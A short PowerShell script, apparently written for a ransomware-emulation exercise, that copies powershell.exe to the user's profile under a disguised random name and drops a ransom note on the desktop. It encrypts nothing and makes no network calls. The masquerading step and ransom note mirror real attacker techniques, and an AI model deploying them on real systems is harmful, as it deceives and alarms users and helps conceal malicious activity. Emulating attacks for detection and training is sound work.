# set up our random number that maches the intel
$rand = Get-Random -Minimum 1000 -Maximum 9876

# make variable for the dest path
$dest = "$env:USERPROFILE\EnNoB-$rand.exe"

# copy the powershell executeable to our home dir with the obfuscated name.
Copy-Item "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination $dest

# Check if the file exists, print an error if it does not
if (Test-Path -Path $dest -PathType Leaf) {
    Write-Output "Found PS exe"
} else {
    Write-Output "Error File Not found!"
}


# Our ransom note
$note = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."

# Write the Ransom Note to the users desktop
$note | Out-File -FilePath "$env:USERPROFILE\Desktop\README.READ"

# Check if the readme exists, print an error if it does not
if (Test-Path -Path "$env:USERPROFILE\Desktop\README.READ" -PathType Leaf) {
    Write-Output "Found Ransom Note"
} else {
    Write-Output "Error File Not found!"
}